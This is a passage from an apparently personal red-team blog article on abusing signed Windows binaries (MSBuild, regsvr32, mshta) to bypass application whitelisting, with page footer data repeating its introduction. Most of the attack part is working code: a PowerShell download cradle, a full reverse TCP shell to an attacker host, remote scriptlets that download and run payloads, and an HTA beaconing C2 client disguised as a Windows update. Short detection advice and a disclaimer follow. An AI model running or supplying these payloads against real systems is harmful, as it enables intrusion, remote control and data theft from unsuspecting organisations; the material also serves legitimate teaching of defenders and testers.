<p>In practice, it's not that simple. Windows includes dozens of legitimate, Microsoft-signed executables that can be abused to execute arbitrary code. These binaries are typically whitelisted by default because administrators need them for legitimate purposes. This creates a perfect opportunity for attackers - we can execute our code through trusted binaries that security policies explicitly allow.</p>
<p>Let me show you the most reliable techniques for bypassing application whitelisting using only native Windows tools.</p>
<h3>MSBuild: Executing C# Code Inline</h3>
<p>MSBuild.exe is Microsoft's build engine, used by Visual Studio and the .NET framework to compile projects. It's a signed Microsoft binary located in the .NET framework directories, and it's almost always whitelisted because developers need it.</p>
<p>Here's what makes MSBuild so powerful for attackers: it can execute inline C# code embedded in XML project files. The build process includes a feature called "inline tasks" that allows you to define and execute .NET code directly within the build file. We can abuse this to run arbitrary C# code without compiling a separate executable.</p>
<p>Let me show you how this works. First, we create an MSBuild project file with embedded C# code:</p>
<pre class="language-xml"><code class="language-xml">&#x3C;Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  &#x3C;!-- Define a target that will execute when the project is built -->
  &#x3C;Target Name="Execute">
    &#x3C;ClassExample />
  &#x3C;/Target>

  &#x3C;!-- Define an inline task with C# code -->
  &#x3C;UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    &#x3C;Task>
      &#x3C;Code Type="Class" Language="cs">
      &#x3C;![CDATA[
        using System;
        using System.Diagnostics;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;

        public class ClassExample : Task
        {
            public override bool Execute()
            {
                // Your malicious code here
                // This example just launches calc.exe, but you could do anything
                Process.Start("calc.exe");

                // Or execute PowerShell
                Process.Start(new ProcessStartInfo()
                {
                    FileName = "powershell.exe",
                    Arguments = "-NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://your-c2.com/payload.ps1')\"",
                    UseShellExecute = false,
                    CreateNoWindow = true
                });

                return true;
            }
        }
      ]]>
      &#x3C;/Code>
    &#x3C;/Task>
  &#x3C;/UsingTask>
&#x3C;/Project>
</code></pre>
<p>Let me break down what's happening here. The <code>&#x3C;UsingTask></code> element defines an inline task using the CodeTaskFactory, which allows us to write C# code directly in the XML. The <code>&#x3C;Code></code> section contains a full C# class that inherits from the Task class. The <code>Execute()</code> method is where our code runs - in this example, I'm launching calc.exe and then executing a PowerShell download cradle.</p>
<p>To execute this, save the XML to a file (let's call it <code>build.xml</code>) and run:</p>
<pre class="language-powershell"><code class="language-powershell"># Execute the MSBuild project
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\temp\build.xml

# Or for 64-bit systems
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\temp\build.xml
</code></pre>
<p>When MSBuild processes this file, it compiles the C# code in memory and executes it. From an application whitelisting perspective, this looks completely legitimate - MSBuild.exe is a trusted Microsoft binary doing what it's designed to do.</p>
<p>The power of this technique is that you can execute any .NET code you want. You could download and execute additional payloads, implement a full reverse shell, execute shellcode through P/Invoke, access Windows APIs for privilege escalation, or perform reconnaissance and data collection. The possibilities are limited only by what you can do in C# code.</p>
<p>Here's a more advanced example that implements a reverse shell:</p>
<pre class="language-xml"><code class="language-xml">&#x3C;Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  &#x3C;Target Name="Execute">
    &#x3C;ReverseShell />
  &#x3C;/Target>
  &#x3C;UsingTask TaskName="ReverseShell" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    &#x3C;Task>
      &#x3C;Code Type="Class" Language="cs">
      &#x3C;![CDATA[
        using System;
        using System.Net;
        using System.Net.Sockets;
        using System.Text;
        using System.IO;
        using System.Diagnostics;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;

        public class ReverseShell : Task
        {
            public override bool Execute()
            {
                try
                {
                    // Connect to attacker's server
                    using (TcpClient client = new TcpClient("attacker-ip", 4444))
                    {
                        using (Stream stream = client.GetStream())
                        {
                            using (StreamReader reader = new StreamReader(stream))
                            using (StreamWriter writer = new StreamWriter(stream))
                            {
                                writer.AutoFlush = true;

                                // Send initial banner
                                writer.WriteLine("MSBuild shell connected from " + Environment.MachineName);

                                // Command loop
                                while (true)
                                {
                                    writer.Write("MSBuild> ");
                                    string command = reader.ReadLine();
                                    if (string.IsNullOrEmpty(command)) break;

                                    if (command.ToLower() == "exit") break;

                                    // Execute command
                                    Process proc = new Process();
                                    proc.StartInfo.FileName = "cmd.exe";
                                    proc.StartInfo.Arguments = "/c " + command;
                                    proc.StartInfo.UseShellExecute = false;
                                    proc.StartInfo.RedirectStandardOutput = true;
                                    proc.StartInfo.RedirectStandardError = true;
                                    proc.Start();

                                    string output = proc.StandardOutput.ReadToEnd();
                                    string error = proc.StandardError.ReadToEnd();
                                    proc.WaitForExit();

                                    writer.WriteLine(output);
                                    if (!string.IsNullOrEmpty(error))
                                        writer.WriteLine("Error: " + error);
                                }
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    // Silently fail - don't want to alert anyone
                }
                return true;
            }
        }
      ]]>
      &#x3C;/Code>
    &#x3C;/Task>
  &#x3C;/UsingTask>
&#x3C;/Project>
</code></pre>
<p>This creates a reverse TCP shell that connects back to your attacker machine. When you run it with MSBuild, you get an interactive shell, all through a trusted Microsoft binary.</p>
<p>What's important to understand is that MSBuild is compiling this code at runtime. The C# code never exists as a compiled .exe or .dll on disk - it's compiled in memory and executed immediately. This makes it very difficult for traditional antivirus to detect because there's no file to scan.</p>
<h3>Regsvr32: Remote Scriptlet Execution</h3>
<p>Regsvr32.exe is the Windows utility for registering and unregistering COM DLLs. It's another signed Microsoft binary that's whitelisted by default. What makes it interesting for bypassing application whitelisting is a lesser-known feature: it can fetch and execute scriptlets from remote URLs.</p>
<p>A scriptlet is a COM object defined in XML with embedded script code (JScript or VBScript). Regsvr32 can download these scriptlets from HTTP/HTTPS URLs and execute the embedded script. This gives us remote code execution through a completely legitimate Windows binary.</p>
<p>Here's how it works. First, you create a .sct (scriptlet) file on your web server:</p>
<pre class="language-xml"><code class="language-xml">&#x3C;?XML version="1.0"?>
&#x3C;scriptlet>
  &#x3C;registration
    description="Bypass"
    progid="Bypass"
    version="1.00"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}"
    remotable="true">
  &#x3C;/registration>

  &#x3C;script language="JScript">
    &#x3C;![CDATA[
      // This code runs when the scriptlet is loaded
      var shell = new ActiveXObject("WScript.Shell");

      // Execute calc.exe as a test
      shell.Run("calc.exe");

      // Or execute PowerShell for real payload delivery
      var command = 'powershell.exe -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://your-c2.com/payload.ps1\')"';
      shell.Run(command, 0, false);

      // Can also create scheduled tasks, modify registry, etc.
    ]]>
  &#x3C;/script>
&#x3C;/scriptlet>
</code></pre>
<p>Save this as <code>bypass.sct</code> on your web server. Then on the target system, execute:</p>
<pre class="language-powershell"><code class="language-powershell"># Download and execute the remote scriptlet
regsvr32.exe /s /n /u /i:http://your-server.com/bypass.sct scrobj.dll
</code></pre>
<p>Let me explain these flags. The <code>/s</code> parameter runs in silent mode without showing message boxes. The <code>/n</code> flag tells regsvr32 not to call DllRegisterServer since we're not actually registering a DLL. The <code>/u</code> flag puts it in unregister mode, which combined with <code>/n</code> just loads the scriptlet without trying to register anything. The <code>/i:http://...</code> parameter specifies the URL to the scriptlet. Finally, <code>scrobj.dll</code> is the Windows Script Component runtime DLL that handles the actual scriptlet execution.</p>
<p>When you run this command, regsvr32 downloads the scriptlet from your server and executes the embedded JScript code. From a network perspective, this looks like a normal HTTP/HTTPS request. From a process perspective, it's regsvr32.exe - a trusted Microsoft binary - doing what it's designed to do.</p>
<p>The scriptlet can do anything that JScript or VBScript can do with ActiveX objects, which is actually quite a lot. You can execute commands via WScript.Shell, create and manipulate files with FileSystemObject, make HTTP requests with XMLHTTP or WinHttp objects, modify the registry, create scheduled tasks, and download additional payloads. Essentially, you have full system access through scripting languages that are built into Windows.</p>
<p>Here's a more sophisticated example that implements a download-and-execute pattern:</p>
<pre class="language-xml"><code class="language-xml">&#x3C;?XML version="1.0"?>
&#x3C;scriptlet>
  &#x3C;registration
    description="Downloader"
    progid="Downloader"
    version="1.00"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
  &#x3C;/registration>

  &#x3C;script language="JScript">
    &#x3C;![CDATA[
      function DownloadAndExecute(url, filename) {
        try {
          // Create XMLHTTP object for downloading
          var xhr = new ActiveXObject("MSXML2.XMLHTTP");
          xhr.open("GET", url, false);
          xhr.send();

          // Save to temp directory
          var stream = new ActiveXObject("ADODB.Stream");
          stream.Type = 1; // Binary
          stream.Open();
          stream.Write(xhr.ResponseBody);

          var tempDir = new ActiveXObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%");
          var filepath = tempDir + "\\" + filename;
          stream.SaveToFile(filepath, 2); // Overwrite
          stream.Close();

          // Execute the downloaded file
          var shell = new ActiveXObject("WScript.Shell");
          shell.Run(filepath, 0, false);

        } catch(e) {
          // Silently fail
        }
      }

      // Execute on load
      DownloadAndExecute("http://your-c2.com/payload.exe", "update.exe");
    ]]>
  &#x3C;/script>
&#x3C;/scriptlet>
</code></pre>
<p>This scriptlet downloads a binary from your C2 server and executes it. The downloaded file does touch disk, but only after you've already bypassed application whitelisting to execute the scriptlet.</p>
<p>One important note: regsvr32 is 32-bit by default on 64-bit systems. If you need 64-bit execution, use:</p>
<pre class="language-powershell"><code class="language-powershell">C:\Windows\System32\regsvr32.exe /s /n /u /i:http://your-server.com/bypass.sct scrobj.dll
</code></pre>
<h3>Mshta: HTML Application Execution</h3>
<p>Mshta.exe is the Windows utility for executing HTML Application (.hta) files. HTA files are essentially HTML pages with full access to Windows APIs through ActiveX objects. Mshta is signed by Microsoft and whitelisted by default because it's a legitimate Windows component.</p>
<p>What makes mshta perfect for bypassing application whitelisting is that it can execute HTA files from remote URLs, and HTA files can contain VBScript or JScript with full system access. It's essentially a browser that runs with no sandbox restrictions.</p>
<p>Here's a basic HTA file:</p>
<pre class="language-html"><code class="language-html">&#x3C;!DOCTYPE html>
&#x3C;html>
&#x3C;head>
  &#x3C;title>Windows Update&#x3C;/title>
  &#x3C;HTA:APPLICATION
    ID="WindowsUpdate"
    APPLICATIONNAME="Windows Update"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    WINDOWSTATE="minimize"
  />

  &#x3C;script language="VBScript">
    Sub Window_OnLoad
      ' This code runs when the HTA loads
      Dim objShell
      Set objShell = CreateObject("WScript.Shell")

      ' Execute calc.exe as a test
      objShell.Run "calc.exe", 0, False

      ' Execute PowerShell for real payload
      Dim command
      command = "powershell.exe -NoProfile -WindowStyle Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://your-c2.com/payload.ps1')"""
      objShell.Run command, 0, False

      ' Close the HTA window
      window.close()
    End Sub
  &#x3C;/script>
&#x3C;/head>
&#x3C;body>
  &#x3C;div>Loading...&#x3C;/div>
&#x3C;/body>
&#x3C;/html>
</code></pre>
<p>Save this as <code>update.hta</code> on your web server. Execute it on the target with:</p>
<pre class="language-powershell"><code class="language-powershell"># Execute remote HTA file
mshta.exe http://your-server.com/update.hta

# Or use vbscript: protocol for inline execution
mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""calc.exe"", 0"))

# JavaScript variant
mshta.exe javascript:a=(GetObject("script:http://your-server.com/payload.js")).Run();close();
</code></pre>
<p>The <code>vbscript:</code> and <code>javascript:</code> protocol handlers are particularly interesting because they let you execute code inline without even fetching a remote file:</p>
<pre class="language-powershell"><code class="language-powershell"># Inline VBScript execution
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell.exe -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString('http://your-c2.com/payload.ps1')"", 0:close")
</code></pre>
<p>This entire command executes without creating any files on disk. The VBScript code is parsed and executed directly from the command line.</p>
<p>Here's a more complete HTA example that implements a basic C2 client:</p>
<pre class="language-html"><code class="language-html">&#x3C;!DOCTYPE html>
&#x3C;html>
&#x3C;head>
  &#x3C;title>System Update&#x3C;/title>
  &#x3C;HTA:APPLICATION
    ID="SystemUpdate"
    APPLICATIONNAME="System Update"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    WINDOWSTATE="minimize"
    SCROLL="no"
  />

  &#x3C;script language="VBScript">
    ' Simple C2 client that beacons to server and executes commands
    Dim objShell, objHTTP, serverURL
    Set objShell = CreateObject("WScript.Shell")
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    serverURL = "http://your-c2.com/command"

    Sub Window_OnLoad
      ' Start beacon loop
      BeaconLoop()
    End Sub

    Sub BeaconLoop()
      On Error Resume Next

      ' Send beacon to server
      objHTTP.Open "GET", serverURL &#x26; "?id=" &#x26; objShell.ExpandEnvironmentStrings("%COMPUTERNAME%"), False
      objHTTP.Send

      If objHTTP.Status = 200 Then
        Dim command
        command = objHTTP.ResponseText

        If Len(command) > 0 Then
          If command = "exit" Then
            window.close()
            Exit Sub
          End If

          ' Execute the command
          Dim result
          result = ExecuteCommand(command)

          ' Send result back to server
          objHTTP.Open "POST", serverURL &#x26; "/result", False
          objHTTP.Send result
        End If
      End If

      ' Wait 5 seconds before next beacon
      window.setTimeout "BeaconLoop()", 5000, "VBScript"
    End Sub

    Function ExecuteCommand(cmd)
      On Error Resume Next
      Dim objExec, output
      Set objExec = objShell.Exec(cmd)

      ' Read output
      output = objExec.StdOut.ReadAll()
      If Len(output) = 0 Then
        output = objExec.StdErr.ReadAll()
      End If

      ExecuteCommand = output
    End Function
  &#x3C;/script>
&#x3C;/head>
&#x3C;body bgcolor="#000000">
  &#x3C;div style="color:#fff;">Updating system components...&#x3C;/div>
&#x3C;/body>
&#x3C;/html>
</code></pre>
<p>This HTA implements a simple beacon-based C2 client. It polls your server for commands, executes them, and sends the results back. All of this happens through mshta.exe, a signed Microsoft binary.</p>
<h3>Why These Techniques Work</h3>
<p>The reason these application whitelisting bypasses are so effective is that they exploit the dual-use nature of legitimate Windows utilities. MSBuild is designed to compile code, regsvr32 is designed to load and execute COM objects, and mshta is designed to run HTML applications with system access.</p>
<p>From an application whitelisting perspective, blocking these utilities is difficult because developers need MSBuild for building .NET applications, system administrators use regsvr32 for managing COM components, and some legacy applications use HTA files for legitimate purposes.</p>
<p>Organizations that try to block these binaries often find that they break legitimate business functionality. This creates a dilemma for defenders: allow these tools and accept the risk, or block them and deal with compatibility issues.</p>
<p>Modern application whitelisting solutions have started implementing additional controls such as blocking execution from user-writable directories, restricting network access for these binaries, monitoring for suspicious command-line arguments, and implementing parent-child process restrictions.</p>
<p>But even with these controls, creative attackers can often find ways to abuse these binaries. The fundamental issue is that these are legitimate, necessary Windows components with powerful capabilities.</p>
<h3>Detection and Mitigation</h3>
<p>From a blue team perspective, detecting abuse of these binaries requires monitoring for unusual patterns. For MSBuild, watch for execution from unexpected locations like user directories or temp folders, unusual parent processes (it should typically be Visual Studio or build automation), network connections from MSBuild.exe, and command-line arguments pointing to XML files in suspicious locations.</p>
<p>For Regsvr32, monitor network connections especially to external IPs, command-line arguments with /i: pointing to URLs, execution with the scrobj.dll parameter, and unusual parent processes. For Mshta, look for network connections to external servers, command-line arguments with http://, vbscript:, or javascript:, execution from unusual parent processes, and child processes spawned by mshta.exe.</p>
<p>Security teams should monitor Windows Event ID 4688 (process creation) with command-line auditing enabled to catch these techniques. Sysmon is even better because it provides detailed process creation, network connection, and parent-process information.</p>
<h2>Conclusion</h2>
<p>Living off the land has fundamentally changed how I approach red team engagements. Instead of dropping tools and hoping they don't get detected, I work entirely within the normal operating environment of Windows systems. I use the same tools that system administrators use every day - PowerShell for automation and management, WMI for remote system queries, certutil for certificate operations, scheduled tasks for maintenance operations, and dozens of other legitimate Windows utilities.</p>
<p>What makes this approach so powerful isn't just that it avoids signature-based detection. It's that it forces defenders to shift from simply blocking known-bad tools to analyzing behavior and distinguishing malicious intent from legitimate administrative activity. This is an incredibly difficult problem for defenders to solve.</p>
<p>Throughout this article, we've covered the complete lifecycle of a post-exploitation operation using only native Windows tools. We started with reconnaissance - understanding the system we've compromised, enumerating domain structure, and identifying targets for lateral movement. We moved through credential harvesting techniques like LSASS memory dumping with rundll32 and comsvcs.dll, registry hive extraction, and searching for credentials in files and PowerShell history.</p>
<p>We explored multiple lateral movement techniques - PowerShell Remoting for modern Windows management, WMI for broader compatibility, DCOM for stealthy execution, scheduled tasks for persistence and execution, and service-based techniques for SYSTEM-level access. Each technique has its place depending on the target environment, your objectives, and the level of monitoring you're facing.</p>
<p>For persistence, we looked at methods ranging from simple registry run keys and startup folder modifications to sophisticated WMI event subscriptions that trigger based on system events. The key with persistence is choosing methods that blend in with the normal system configuration and are unlikely to be discovered during routine administration.</p>
<p>Finally, we covered data exfiltration using HTTP/HTTPS with PowerShell, certutil for file transfers, BITS for resumable background transfers, SMB for direct file copying, DNS for stealthy data tunneling, and email for leveraging existing communication channels.</p>
<p>From a defender's perspective, detecting these techniques requires a fundamental shift in approach. You can't rely on signature-based detection when attackers are using signed Microsoft binaries doing what they're designed to do. Instead, you need comprehensive logging - PowerShell script block logging, command-line process auditing, WMI activity monitoring, and Sysmon for detailed system activity. You need behavioral analytics that can identify suspicious patterns like PowerShell downloading and executing scripts from the internet, WMI being used to create processes on remote systems at unusual times, scheduled tasks being created with suspicious command lines, or abnormal data transfer patterns that might indicate exfiltration.</p>
<p>The cat-and-mouse game between red and blue teams continues to evolve. As defenders get better at detecting specific living-off-the-land techniques, attackers find new ways to abuse legitimate functionality. The techniques in this article represent current best practices, but they're not static - both offensive and defensive capabilities continue to advance.</p>
<p>One thing I've learned from years of red teaming is that technical sophistication only gets you so far. The most successful operations combine technical skill with operational security discipline. It doesn't matter how stealthy your techniques are if you leave obvious traces, work during suspicious hours, or exfiltrate terabytes of data in a single burst. Success requires understanding not just how to execute techniques, but when to use them, what logs they create, and how to make your activity blend in with legitimate operations.</p>
<p>Remember that everything in this article should only be used in authorized security assessments, penetration tests, and red team engagements. Unauthorized access to computer systems is illegal and unethical. Always operate within proper legal and ethical boundaries, maintain clear authorization documentation, and follow responsible disclosure practices for any vulnerabilities you discover.</p>
<h2>References</h2>
<ul>
<li><a href="https://lolbas-project.github.io/">LOLBAS Project</a> - Comprehensive database of Living Off the Land binaries and scripts</li>
<li><a href="https://attack.mitre.org/tactics/TA0002/">MITRE ATT&#x26;CK - Execution</a> - Execution tactics and techniques</li>
<li><a href="https://attack.mitre.org/tactics/TA0003/">MITRE ATT&#x26;CK - Persistence</a> - Persistence mechanisms</li>
<li><a href="https://attack.mitre.org/tactics/TA0008/">MITRE ATT&#x26;CK - Lateral Movement</a> - Lateral movement techniques</li>
<li><a href="https://docs.microsoft.com/en-us/powershell/">PowerShell Documentation</a> - Official Microsoft PowerShell documentation</li>
<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">Windows Sysinternals Sysmon</a> - System monitoring and logging tool</li>
<li><a href="https://devblogs.microsoft.com/powershell/powershell-the-blue-team/">PowerShell ‚ô• the Blue Team</a> - PowerShell security features and logging</li>
<li><a href="https://adsecurity.org/">Active Directory Security</a> - Active Directory attack and defense techniques</li>
<li><a href="http://blog.harmj0y.net/">Harmj0y's Blog</a> - Advanced PowerShell and AD techniques</li>
<li><a href="https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504">Red Team Field Manual</a> - Quick reference for offensive operations</li>
</ul>
<hr>
<p><em>Disclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.</em></p>
</div></article></main><footer class="bg-primary/90 border-t border-gray-800"><div class="container py-6"><div class="flex justify-center items-center"><div class="text-sm text-gray-400">¬© <!-- -->2025<!-- --> Ivan Spiridonov (xbz0n). All rights reserved.</div></div></div></footer></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"slug":"living-off-the-land-windows","contentHtml":"\n\u003cp\u003e\u003cimg src=\"/images/lolbins-windows.jpg\" alt=\"Windows post-exploitation techniques\"\u003e\u003c/p\u003e\n\u003ch2\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eI'll never forget one of my first red team engagements where I learned this lesson the hard way. I'd spent two days carefully phishing my way into a financial services company, finally landing a shell on a mid-level accountant's workstation. Excited about my success, I immediately uploaded Mimikatz to dump credentials. Within 15 minutes, my access was gone. The SOC had caught me, isolated the machine, and I was back to square one.\u003c/p\u003e\n\u003cp\u003eThe problem wasn't that I got caught - that happens. The problem was that I'd made it ridiculously easy for them. Modern endpoint detection and response (EDR) solutions are trained to recognize offensive tools like Mimikatz, BloodHound, PowerShell Empire, and Cobalt Strike. These tools have well-known signatures, behaviors, and artifacts. The moment you drop them on disk or execute them in memory, you're essentially announcing your presence to anyone who's watching.\u003c/p\u003e\n\u003cp\u003eHere's what changed my approach completely: on my next engagement, I decided to use only tools that were already on the target systems. No uploads, no custom binaries, nothing that would raise immediate red flags. Just PowerShell, WMI, and other built-in Windows utilities. The result? I maintained access for three weeks, moved laterally across 15 systems, and exfiltrated the target data - all without triggering a single alert.\u003c/p\u003e\n\u003cp\u003eThat's the power of \"living off the land.\" Instead of bringing your own tools and hoping they won't be detected, you use what's already there. Windows comes packed with incredibly powerful administrative utilities - PowerShell, Windows Management Instrumentation (WMI), certutil, bitsadmin, and dozens of other legitimate executables. These tools are signed by Microsoft, they're supposed to be on the system, and administrators use them every single day.\u003c/p\u003e\n\u003cp\u003eWhat makes this approach so effective isn't just that you avoid signature-based detection. It's that you force defenders to focus on behavioral analysis instead of simple file or process signatures. Security teams can't just block PowerShell or disable WMI - their own IT staff relies on these tools for day-to-day system administration. This creates a fundamental challenge for defenders: how do you distinguish malicious use of legitimate tools from normal administrative activity?\u003c/p\u003e\n\u003cp\u003eIn this article, I'll walk you through everything I've learned about conducting complete post-exploitation operations using nothing but native Windows tools. We'll cover initial reconnaissance, credential harvesting, lateral movement, persistence mechanisms, and data exfiltration - all while maintaining the lowest possible operational footprint. More importantly, I'll explain why these techniques work, what defenders see when you use them, and how to make your operations blend in with legitimate administrative activity.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2\u003eüîÑ EDIT (December 2, 2025): The Modern Detection Landscape\u003c/h2\u003e\n\u003cp\u003eAfter publishing this article, I received valuable feedback from fellow security professionals about the current state of EDR detection for these techniques. I want to address this head-on because it's crucial context for anyone learning these methods in 2025.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eThe reality is this: many of the \"classic\" LOLBin techniques described in this article are now heavily monitored and flagged by modern EDR solutions.\u003c/strong\u003e When I first learned these techniques years ago, they were relatively quiet. Today's security landscape is different.\u003c/p\u003e\n\u003cp\u003eHere's what you need to know about detection in 2025:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eHigh-Risk Techniques (Loud on Modern EDRs):\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eLSASS memory access\u003c/strong\u003e (comsvcs.dll dumps, procdump) - Immediate alerts on CrowdStrike, Defender ATP, SentinelOne, Carbon Black\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRegistry hive dumps\u003c/strong\u003e (SAM/SECURITY/SYSTEM) - Straightforward detection rules exist\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCertutil downloads\u003c/strong\u003e - Flagged even by Windows Defender in many configurations\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eNltest/dsquery/setspn enumeration\u003c/strong\u003e - Detection engineers are creating specific use cases for these\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eWMI remote execution\u003c/strong\u003e - Behavioral detections in restricted corporate environments\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRundll32 with comsvcs\u003c/strong\u003e - Process tree analysis makes this obvious\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eWhat This Means for Real Engagements:\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eThese techniques are \u003cstrong\u003efoundational knowledge\u003c/strong\u003e - they teach you how Windows works and what's possible with built-in tools. However, using them as-is in a modern, hardened environment will likely get you caught quickly. They're building blocks, not complete solutions.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTo operate successfully in 2025, you need to layer these techniques with:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eAMSI bypasses\u003c/strong\u003e for PowerShell operations\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDirect syscalls\u003c/strong\u003e to avoid EDR hooks\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProcess injection\u003c/strong\u003e to hide execution chains and parent-child relationships\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMemory-only execution\u003c/strong\u003e to avoid disk-based artifacts\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCustom tool modifications\u003c/strong\u003e to avoid known signatures\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBehavioral blending\u003c/strong\u003e to match legitimate admin activity patterns\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePPL/Credential Guard bypasses\u003c/strong\u003e for credential access\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eWhy I'm Keeping This Article As-Is:\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eThis article documents fundamental techniques that every security professional should understand. These methods work perfectly in:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eLab environments\u003c/strong\u003e and home labs for learning\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eLegacy systems\u003c/strong\u003e without modern EDR\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSecurity research\u003c/strong\u003e and understanding Windows internals\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBuilding custom tools\u003c/strong\u003e that incorporate evasion techniques\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRed team operations\u003c/strong\u003e when properly adapted with evasion layers\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThink of these techniques as learning the alphabet before writing poetry. You need to understand these fundamentals before you can effectively implement the advanced evasion techniques required for modern environments.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eThe Bottom Line:\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eIf you're planning to use these techniques on a real engagement against a mature security program with modern EDR, you'll need to significantly adapt them. The concepts are sound, but the implementation needs sophistication beyond what's shown here. Consider this a starting point for building more advanced tradecraft, not a copy-paste playbook for 2025 engagements.\u003c/p\u003e\n\u003cp\u003eI'll be adding specific EDR detection warnings throughout the article to highlight which techniques are particularly noisy in modern environments.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2\u003eUnderstanding Living Off the Land\u003c/h2\u003e\n\u003cp\u003eBefore we dive into specific techniques, let's talk about what \"living off the land\" actually means and why it's become such a critical part of modern red teaming.\u003c/p\u003e\n\u003cp\u003eThe term comes from the military concept of living off the land during operations - using local resources instead of bringing your own supplies. In cybersecurity, it refers to using built-in system tools and legitimate executables for malicious purposes. These binaries are often called LOLBins (Living Off the Land Binaries) or LOLBAs (Living Off the Land Binaries and Scripts).\u003c/p\u003e\n\u003cp\u003eThe \u003ca href=\"https://lolbas-project.github.io/\"\u003eLOLBAS Project\u003c/a\u003e maintains the most comprehensive database of Windows binaries that can be abused for offensive operations. When I'm planning an engagement, I always reference this project because it documents exactly how each binary can be abused, what permissions are required, and what artifacts are left behind. But here's the key thing to understand: these aren't vulnerabilities or exploits. They're legitimate features being used in ways Microsoft didn't necessarily intend, but that aren't technically \"wrong\" from a system perspective.\u003c/p\u003e\n\u003cp\u003eLet me give you a concrete example. Take certutil.exe - it's a legitimate Windows utility designed for managing certificates. System administrators use it all the time for certificate operations. But certutil also happens to have a feature that lets you download files from URLs. Microsoft included this feature for legitimate purposes - downloading certificate revocation lists, for example. But from an attacker's perspective, it's a perfect tool for downloading payloads or exfiltrating data. When you use certutil to download a file, Windows Defender doesn't flag it as malicious because certutil is a signed Microsoft binary doing exactly what it's designed to do.\u003c/p\u003e\n\u003cp\u003eThis creates a fundamental asymmetry that favors attackers. Defenders have to distinguish between legitimate use (an admin downloading a certificate) and malicious use (an attacker downloading a payload) of the exact same command. The tool itself isn't malicious, the binary isn't suspicious, and the signature is valid. The only difference is the intent behind the action.\u003c/p\u003e\n\u003cp\u003eHere's why this approach is so powerful in modern environments. You eliminate the need to upload anything to the target system, which means every potential detection point disappears. EDR solutions scan new files, behavioral analysis engines watch for unusual file creation patterns, and forensic investigators can find your tools long after you're gone. When you use only built-in tools, there's nothing suspicious to find because you're using tools that are supposed to be there.\u003c/p\u003e\n\u003cp\u003eEverything you run is signed by Microsoft and trusted by the operating system. Application whitelisting solutions are designed to prevent unauthorized executables from running, but they won't stop you because you're using executables that are explicitly whitelisted by default. Even strict AppLocker policies typically whitelist system directories where these tools live, so you can operate without triggering application control mechanisms.\u003c/p\u003e\n\u003cp\u003eYour activity blends in with normal administrative operations in a way that's nearly impossible to distinguish without deep behavioral analysis. System administrators use PowerShell constantly for automation and management. They use WMI for remote system queries. They create scheduled tasks for maintenance operations. When you use these same tools, your actions look like normal IT activity in the logs. This makes life incredibly difficult for SOC analysts trying to identify malicious activity in a sea of legitimate operations.\u003c/p\u003e\n\u003cp\u003eDefenders can't simply block these tools without breaking their own IT operations, which creates a fundamental dilemma for security teams. I've seen organizations try to disable PowerShell after getting compromised, only to realize 